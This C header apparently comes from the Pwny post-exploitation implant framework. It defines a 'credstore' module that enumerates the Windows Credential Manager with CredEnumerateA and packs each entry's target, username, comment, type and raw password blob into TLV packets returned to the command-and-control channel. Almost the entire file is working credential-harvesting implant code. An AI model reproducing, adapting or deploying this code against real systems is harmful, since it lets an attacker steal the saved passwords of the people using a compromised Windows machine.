/*
 * MIT License
 *
 * Copyright (c) 2020-2024 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#ifndef _CREDSTORE_H_
#define _CREDSTORE_H_

#include <windows.h>
#include <wincred.h>
#include <string.h>

#include <pwny/tlv.h>
#include <pwny/api.h>
#include <pwny/c2.h>
#include <pwny/tlv_types.h>
#include <pwny/misc.h>
#include <pwny/log.h>

#pragma comment(lib, "advapi32.lib")

#define CREDSTORE_BASE 17

#define CREDSTORE_LIST \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       CREDSTORE_BASE, \
                       API_CALL)

#define TLV_TYPE_CRED_TARGET   TLV_TYPE_CUSTOM(TLV_TYPE_STRING, CREDSTORE_BASE, API_TYPE)
#define TLV_TYPE_CRED_USER     TLV_TYPE_CUSTOM(TLV_TYPE_STRING, CREDSTORE_BASE, API_TYPE + 1)
#define TLV_TYPE_CRED_PASS     TLV_TYPE_CUSTOM(TLV_TYPE_STRING, CREDSTORE_BASE, API_TYPE + 2)
#define TLV_TYPE_CRED_COMMENT  TLV_TYPE_CUSTOM(TLV_TYPE_STRING, CREDSTORE_BASE, API_TYPE + 3)
#define TLV_TYPE_CRED_TYPE     TLV_TYPE_CUSTOM(TLV_TYPE_INT, CREDSTORE_BASE, API_TYPE)
#define TLV_TYPE_CRED_GROUP    TLV_TYPE_CUSTOM(TLV_TYPE_GROUP, CREDSTORE_BASE, API_TYPE)

static const char *cred_type_name(DWORD type)
{
    switch (type)
    {
        case CRED_TYPE_GENERIC:                 return "Generic";
        case CRED_TYPE_DOMAIN_PASSWORD:         return "Domain";
        case CRED_TYPE_DOMAIN_CERTIFICATE:      return "Certificate";
        case CRED_TYPE_DOMAIN_VISIBLE_PASSWORD: return "Visible";
        default:                                return "Unknown";
    }
}

static tlv_pkt_t *credstore_list(c2_t *c2)
{
    PCREDENTIALA *creds;
    DWORD count;
    DWORD i;
    tlv_pkt_t *result;

    if (!CredEnumerateA(NULL, 0, &count, &creds))
    {
        log_debug("* CredEnumerate failed (%lu)\n", GetLastError());
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);

    for (i = 0; i < count; i++)
    {
        PCREDENTIALA cred = creds[i];
        tlv_pkt_t *entry;
        char pass_buf[512];

        entry = tlv_pkt_create();

        if (cred->TargetName)
        {
            tlv_pkt_add_string(entry, TLV_TYPE_CRED_TARGET, cred->TargetName);
        }

        if (cred->UserName)
        {
            tlv_pkt_add_string(entry, TLV_TYPE_CRED_USER, cred->UserName);
        }

        if (cred->Comment)
        {
            tlv_pkt_add_string(entry, TLV_TYPE_CRED_COMMENT, cred->Comment);
        }

        tlv_pkt_add_u32(entry, TLV_TYPE_CRED_TYPE, (int32_t)cred->Type);

        if (cred->CredentialBlobSize > 0 && cred->CredentialBlob != NULL)
        {
            DWORD blob_len = cred->CredentialBlobSize;
            if (blob_len >= sizeof(pass_buf))
            {
                blob_len = sizeof(pass_buf) - 1;
            }
            memcpy(pass_buf, cred->CredentialBlob, blob_len);
            pass_buf[blob_len] = '\0';
            tlv_pkt_add_string(entry, TLV_TYPE_CRED_PASS, pass_buf);
        }

        tlv_pkt_add_tlv(result, TLV_TYPE_CRED_GROUP, entry);
        tlv_pkt_destroy(entry);
    }

    CredFree(creds);

    return result;
}

void register_credstore_api_calls(api_calls_t **api_calls)
{
    api_call_register(api_calls, CREDSTORE_LIST, credstore_list);
}

#endif
